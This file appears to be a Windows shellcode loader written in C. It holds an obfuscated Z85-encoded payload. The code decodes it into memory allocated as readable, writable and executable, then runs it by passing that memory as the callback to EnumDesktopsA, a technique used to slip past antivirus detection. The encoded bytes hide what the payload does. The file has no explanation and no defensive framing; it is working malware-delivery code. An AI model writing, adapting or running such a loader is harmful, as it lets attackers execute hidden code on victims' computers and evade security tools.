#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <z85.h>
#include <z85.c>
#include <windows.h>

int main(int argc, char* argv[]) {
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;

  char e_shellcode[] = "3@78z1[C&K*>*fqf06%EFp/pd>nhnL7nq*wNk1HPf7^pGGqxOd]I/ISTndSg4n>?4Znhm]YjyJQsefEl{:QHJp.q:&Wk#x*pI=7VYI:xJ%0NK2*Fqsg907.*VBz<XJ=}(]:neKJUI:eyR0NP>inDl^}l5NNQncdpog08%vZ]P&r:QHJp.8Qv}[JGRGoE6)jiNJ02suYchkQn]4=$kEcIWScum2KqInDEg4l5L(4ncd76sv34}sZ19[l0lGSnq3mKk#N:vsv37[k1HOA>$g{P%6m/VJG2K>002r@oM}/*%j6YY.2KDn06S@kL[0/{06T8oG=Zr}07X&^laPHqrTnVPnhnjLY70b4r@ZYvx!h*#vqNb=zF%-yz!%1=m}=*ZBrBU6y?s!-vpxjVB7GwFga)9NyYBCn";
  char d_shellcode[314] = {};
  size_t d = Z85_decode_with_padding(e_shellcode, d_shellcode, strlen(e_shellcode));
  LPVOID mem = VirtualAlloc(NULL, sizeof(d_shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, d_shellcode, sizeof(d_shellcode));
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, 0);
  return 0;
}
